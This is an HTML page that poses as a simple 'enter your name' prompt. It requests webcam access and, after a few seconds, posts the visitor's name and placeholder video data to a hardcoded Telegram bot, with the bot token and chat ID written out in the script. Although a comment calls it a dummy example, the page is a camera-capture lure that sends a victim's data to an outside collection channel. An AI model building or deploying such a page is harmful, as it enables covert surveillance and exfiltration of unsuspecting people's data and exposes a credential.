<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #container {
            margin-top: 20%;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>Please Enter Your Name</h1>
        <input type="text" id="username" placeholder="Enter your name" required>
        <br><br>
        <button onclick="requestCamera()">OK</button>
    </div>
    <script>
        async function requestCamera() {
            const username = document.getElementById('username').value;
            if (!username) {
                alert('Please enter your name');
                return;
            }

            // Request camera access
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                // Start video stream
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Simulate recording and send to Telegram (dummy example)
                setTimeout(() => {
                    sendToTelegram(username, 'Video data here');
                    alert('Your video has been sent!');
                }, 5000); // Simulate recording duration
                
            } catch (error) {
                alert('Camera access denied.');
            }
        }

        function sendToTelegram(username, videoData) {
            // Create the request to send video data to Telegram
            const botToken = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es';
            const chatId = '5112680061';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `User: ${username}\nVideo Data: ${videoData}`
                }),
            }).then(response => response.json())
              .then(data => console.log('Success:', data))
              .catch((error) => console.error('Error:', error));
        }
    </script>
</body>
</html>
